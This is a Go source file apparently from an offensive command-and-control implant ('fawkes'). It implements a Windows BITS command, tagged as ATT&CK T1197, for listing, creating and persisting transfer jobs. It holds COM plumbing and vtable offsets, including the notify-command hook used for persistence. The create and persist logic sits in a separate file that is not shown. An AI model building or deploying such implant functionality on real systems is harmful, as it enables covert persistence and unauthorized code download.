//go:build windows
// +build windows

// bits.go implements the BITS command for managing BITS transfer jobs.
// Job operations (list, create, persist, cancel, etc.) are in bits_actions.go.

package commands

import (
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"syscall"
	"unsafe"

	ole "github.com/go-ole/go-ole"

	"fawkes/pkg/structs"
)

type BitsCommand struct{}

func (c *BitsCommand) Name() string {
	return "bits"
}

func (c *BitsCommand) Description() string {
	return "Manage BITS transfer jobs — list, create, persist, cancel, suspend, resume, complete (T1197)"
}

type bitsArgs struct {
	Action  string `json:"action"`
	Name    string `json:"name"`
	URL     string `json:"url"`
	Path    string `json:"path"`
	Command string `json:"command"`
	CmdArgs string `json:"cmd_args"`
}

// COM GUIDs for BITS
var (
	clsidBITS   = ole.NewGUID("{4991D34B-80A1-4291-83B6-3328366B9097}")
	iidBITSMgr  = ole.NewGUID("{5CE34C0D-0DC9-4C1F-897C-DAA1B78CEE7C}")
	iidBITSJob  = ole.NewGUID("{37668D37-507E-4160-9316-26306D150B12}")
	iidBITSJob2 = ole.NewGUID("{54B50739-686F-45EB-9DFF-D6A9A0FAA9AF}")
	iidBITSEnum = ole.NewGUID("{1AF4F612-3B71-466F-8F58-7B6F73AC57AD}")
)

// IBackgroundCopyManager vtable offsets (after IUnknown 0-2)
const (
	bitsVtCreateJob = 3
	bitsVtGetJob    = 4
	bitsVtEnumJobs  = 5
)

// IBackgroundCopyJob vtable offsets (after IUnknown 0-2)
const (
	bitsJobVtAddFileSet     = 3
	bitsJobVtAddFile        = 4
	bitsJobVtSuspend        = 6
	bitsJobVtResume         = 7
	bitsJobVtCancel         = 8
	bitsJobVtComplete       = 9
	bitsJobVtGetId          = 10
	bitsJobVtGetProgress    = 12
	bitsJobVtGetState       = 14
	bitsJobVtGetDisplayName = 18
	bitsJobVtSetNotifyFlags = 23
)

// IBackgroundCopyJob2 vtable offsets (extends IBackgroundCopyJob)
const (
	bitsJob2VtSetNotifyCmdLine = 34
)

// IEnumBackgroundCopyJobs vtable offsets
const (
	bitsEnumVtNext     = 3
	bitsEnumVtGetCount = 7
)

// BG_JOB_TYPE constants
const (
	bgJobTypeDownload = 0
)

// BG_JOB_STATE constants
var bitsJobStates = []string{
	"Queued", "Connecting", "Transferring", "Suspended",
	"Error", "TransientError", "Transferred", "Acknowledged", "Cancelled",
}

// BG_NOTIFY constants
const (
	bgNotifyJobTransferred = 0x0001
	bgNotifyJobError       = 0x0002
)

// bgJobProgress matches BG_JOB_PROGRESS
type bgJobProgress struct {
	BytesTotal       uint64
	BytesTransferred uint64
	FilesTotal       uint32
	FilesTransferred uint32
}

func (c *BitsCommand) Execute(task structs.Task) structs.CommandResult {
	var args bitsArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if args.Action == "" {
		args.Action = "list"
	}

	switch args.Action {
	case "list":
		return bitsList()
	case "create":
		return bitsCreate(args)
	case "persist":
		return bitsPersist(args)
	case "cancel":
		return bitsCancel(args)
	case "suspend":
		return bitsJobAction(args, bitsJobVtSuspend, "Suspended")
	case "resume":
		return bitsJobAction(args, bitsJobVtResume, "Resumed")
	case "complete":
		return bitsJobAction(args, bitsJobVtComplete, "Completed")
	default:
		return errorf("Unknown action: %s (use: list, create, persist, cancel, suspend, resume, complete)", args.Action)
	}
}

// bitsComCall invokes a COM vtable method on an interface pointer.
func bitsComCall(obj uintptr, vtableIndex int, args ...uintptr) (uintptr, error) {
	vtablePtr := *(*uintptr)(unsafe.Pointer(obj))
	fnPtr := *(*uintptr)(unsafe.Pointer(vtablePtr + uintptr(vtableIndex)*unsafe.Sizeof(uintptr(0))))
	allArgs := make([]uintptr, 0, len(args)+1)
	allArgs = append(allArgs, obj)
	allArgs = append(allArgs, args...)
	hr, _, _ := syscall.SyscallN(fnPtr, allArgs...)
	if int32(hr) < 0 {
		return hr, fmt.Errorf("HRESULT 0x%08X", uint32(hr))
	}
	return hr, nil
}

// bitsConnect creates a BITS manager COM connection.
func bitsConnect() (uintptr, func(), error) {
	runtime.LockOSThread()

	err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED)
	if err != nil {
		oleErr, ok := err.(*ole.OleError)
		if !ok || (oleErr.Code() != ole.S_OK && oleErr.Code() != 0x00000001) {
			runtime.UnlockOSThread()
			return 0, nil, fmt.Errorf("CoInitializeEx: %v", err)
		}
	}

	unk, err := ole.CreateInstance(clsidBITS, iidBITSMgr)
	if err != nil {
		ole.CoUninitialize()
		runtime.UnlockOSThread()
		return 0, nil, fmt.Errorf("CreateInstance: %v", err)
	}

	mgr := uintptr(unsafe.Pointer(unk))

	cleanup := func() {
		bitsComCall(mgr, 2) // Release
		ole.CoUninitialize()
		runtime.UnlockOSThread()
	}

	return mgr, cleanup, nil
}

// Helper functions

var (
	bitsOle32          = syscall.NewLazyDLL("ole32.dll")
	bitsCoTaskMemFreeP = bitsOle32.NewProc("CoTaskMemFree")
)

func bitsCoTaskMemFree(ptr uintptr) {
	bitsCoTaskMemFreeP.Call(ptr)
}

func bitsReadWString(ptr uintptr) string {
	if ptr == 0 {
		return ""
	}
	var chars []uint16
	for i := 0; ; i++ {
		c := *(*uint16)(unsafe.Pointer(ptr + uintptr(i)*2))
		if c == 0 {
			break
		}
		chars = append(chars, c)
		if i > 1024 {
			break
		}
	}
	return syscall.UTF16ToString(chars)
}
